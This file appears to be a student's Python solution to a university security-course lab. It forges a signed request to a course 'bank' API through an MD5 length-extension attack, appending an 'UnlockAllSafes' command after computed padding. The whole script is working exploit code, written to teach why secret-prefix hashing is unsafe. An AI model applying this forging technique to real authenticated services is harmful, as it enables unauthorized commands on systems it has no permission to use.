import sys, urllib.parse
from pymd5 import md5, padding
from urllib.parse import urlparse
# Copy this to place when running this program
# "http://bank.cse127.ucsd.edu/pa5/api?token=d6613c382dbb78b5592091e08f6f41fe&user=nadiah&command1=ListSquirrels&command2=NoOp"

url = sys.argv[1]
# hash is length 32
# original token is a hash of the password and commands
# update original hash with the command we want to append "&uncommand3=......Safes"
# hash this user=nadiah&command1=ListSquirrels&command2=NoOp || &command3=UnlockAllSafes by updating
# construct new URL
 
hostname = url[url.find(urlparse(url).hostname):url.find(urlparse(url).hostname)+len(urlparse(url).hostname)]
#print("hostname: " + hostname)
dir = url[url.find("/pa5/api?"):url.find("/pa5/api?")+9]
#print("path: " + dir)
token = url[url.find("token")+6:url.find("token")+6+32]
#print("token: " + token)
user = url[url.find("user")+5:url.find("command1")-1]
#print("user: " + user)
cmd1 = url[url.find("command1")+9:url.find("command2")-1]
#print("command1: " + cmd1)
cmd2 = url[url.find("command2")+9:]
#print("command2: " + cmd2)

#print(command)
#must use the old token somewhere because that contains the password hashed into the command

oldCmd = "user="+user+"&command1="+cmd1+"&command2="+cmd2
newCmd = "&command3=UnlockAllSafes"

bits = (len(oldCmd) + len(padding(len(oldCmd)*8)))*8
newToken = md5(state=bytes.fromhex(token), count=bits)
#print(str(padding((len(oldCmd)+8)*8)))

#original token is from using md5(state=original token) with the padded original input
#update this with newCmd 
#now to append the newCmd to the url, we can't just append it directly to the oldCmd
    #oldCmd+newCmd won't work because the new hash starts from the original hash which
    #resulted from user=..+padding, so the appropriate url should be 
    #user=..+padding+newCmd, the padding should fill in the remaining bits in the 512bit chunk
pad = urllib.parse.quote(padding((len(oldCmd)+8)*8))
newToken.update(newCmd)

new_url = "http://"+hostname+dir+"token="+newToken.hexdigest()+"&"+oldCmd+pad+newCmd
print(new_url)

